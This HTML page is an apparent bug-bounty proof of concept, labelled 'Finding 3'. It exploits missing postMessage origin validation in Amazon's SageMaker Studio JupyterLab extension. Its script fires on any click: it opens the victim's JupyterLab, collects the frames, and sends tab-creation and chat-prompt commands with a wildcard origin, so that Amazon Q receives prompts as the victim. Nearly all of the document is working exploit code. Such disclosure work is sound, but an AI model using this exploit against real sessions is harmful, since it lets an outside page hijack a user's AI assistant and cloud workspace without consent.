<!DOCTYPE html>
<html>
<head>
  <title>Finding 3 — postMessage Amazon Q Hijack PoC</title>
  <style>
    body { font-family: monospace; background: #ffffff; color: #1a1a2e; padding: 30px; cursor: pointer; }
    h1 { color: #1565c0; font-size: 18px; }
    label { display: block; color: #5a5a7a; font-size: 12px; margin-top: 10px; }
    input { width: 100%; background: #f0f4ff; border: 1px solid #90b0e0; color: #1a1a2e;
            padding: 8px; font-family: monospace; font-size: 13px; margin-top: 4px; }
    button { background: #1565c0; color: #fff; border: none; padding: 10px 25px;
             font-family: monospace; font-size: 14px; cursor: pointer; margin-top: 15px; margin-right: 5px; }
    #status { margin-top: 15px; font-size: 13px; }
    .ok { color: #2e7d32; } .err { color: #c62828; } .warn { color: #e65100; }
  </style>
</head>
<body>
  <h1>PoC: postMessage → Amazon Q Hijack (SageMaker Studio)</h1>
  <p style="color:#5a5a7a;font-size:12px">@amzn/sagemaker_gen_ai_jupyterlab_extension — missing origin validation on 19 commands incl. aws/chat/sendChatPrompt, insertToCursorPosition</p>

  <label>Target JupyterLab URL:</label>
  <input id="url" value="https://xxxxxx.studio.us-east-1.sagemaker.aws/jupyterlab/default/lab" />
  <label>Wait for JupyterLab to load (ms):</label>
  <input id="wait" value="15000" />
  <p style="color:#5a5a7a;font-size:11px;margin-top:6px">Click anywhere on this page — it opens JupyterLab, then sends a chat prompt to Amazon Q as the victim.</p>

  <button id="launchBtn">Click Anywhere To Launch Exploit</button>
  <div id="status"></div>

<script>
var launched = false;
document.addEventListener('click', function(e) {
  if (e.target.tagName === 'INPUT') return;
  if (!launched) { launched = true; exploit(); }
});

// Listen for any responses from the target window
window.addEventListener('message', function(e) {
  status('← Response: ' + JSON.stringify(e.data), 'warn');
});

function status(msg, cls) {
  document.getElementById('status').innerHTML += '<div class="' + (cls||'') + '">' + msg + '</div>';
}

function shortId() {
  return Math.random().toString(36).substring(2, 8);
}

function collectFrames(win, depth, max) {
  var results = [];
  if (depth > max) return results;
  results.push(win);
  try {
    for (var i = 0; i < win.length; i++) {
      try {
        results = results.concat(collectFrames(win[i], depth + 1, max));
      } catch(e) { results.push(win[i]); }
    }
  } catch(e) {}
  return results;
}

function sendToAll(targets, msg) {
  targets.forEach(function(t) {
    try { t.postMessage(msg, '*'); } catch(e) {}
  });
}

function firePayloads(w) {
  var targets = collectFrames(w, 0, 5);
  status('Found ' + targets.length + ' target(s) (recursive). Sending payload...', 'ok');

  var prompt = 'Hello, what can you help me with?';
  var tabId = shortId();

  // Step 1: Create tab — matches known working format exactly
  var tabAddMsg = { command: 'aws/chat/tabAdd', params: { tabId: tabId, restoredTab: false } };
  sendToAll(targets, tabAddMsg);
  status('→ tabAdd (tabId=' + tabId + ') sent to ' + targets.length + ' frame(s)', 'ok');

  // Step 2: Send prompt — try multiple tabId placements after delay
  setTimeout(function() {
    // Format A: tabId inside params (current)
    var msgA = {
      command: 'aws/chat/sendChatPrompt',
      params: {
        tabId: tabId,
        prompt: { prompt: prompt, escapedPrompt: prompt }
      }
    };

    // Format B: tabId at top level alongside command
    var msgB = {
      command: 'aws/chat/sendChatPrompt',
      tabId: tabId,
      params: {
        prompt: { prompt: prompt, escapedPrompt: prompt }
      }
    };

    // Format C: tabId at both levels
    var msgC = {
      command: 'aws/chat/sendChatPrompt',
      tabId: tabId,
      params: {
        tabId: tabId,
        prompt: { prompt: prompt, escapedPrompt: prompt }
      }
    };

    sendToAll(targets, msgA);
    status('→ sendChatPrompt format A (tabId in params)', 'ok');
    sendToAll(targets, msgB);
    status('→ sendChatPrompt format B (tabId top-level)', 'ok');
    sendToAll(targets, msgC);
    status('→ sendChatPrompt format C (tabId both levels)', 'ok');

    status('Watching for responses below...', 'warn');
  }, 2000);
}

function exploit() {
  var url = document.getElementById('url').value.trim();
  var wait = parseInt(document.getElementById('wait').value) || 12000;

  var w = window.open(url, 'sagemaker_target');
  if (!w) { status('Popup blocked — allow popups and retry.', 'err'); return; }
  status('Popup opened. Polling until ready (up to ' + wait + 'ms)...', 'warn');

  var elapsed = 0;
  var interval = 2000;
  var timer = setInterval(function() {
    elapsed += interval;

    var closed = false;
    var frameCount = 0;
    try { closed = w.closed; } catch(e) {}
    try { frameCount = w.length; } catch(e) {}

    if (closed) {
      if (elapsed >= wait) { clearInterval(timer); status('Popup was closed.', 'err'); }
      return;
    }

    status('Poll ' + (elapsed/1000) + 's: window alive, ' + frameCount + ' frame(s)', '');

    if (frameCount > 0) {
      clearInterval(timer);
      firePayloads(w);
    } else if (elapsed >= wait) {
      clearInterval(timer);
      status('Timeout reached. Firing payloads to window anyway...', 'warn');
      firePayloads(w);
    }
  }, interval);
}
</script>
</body>
</html>
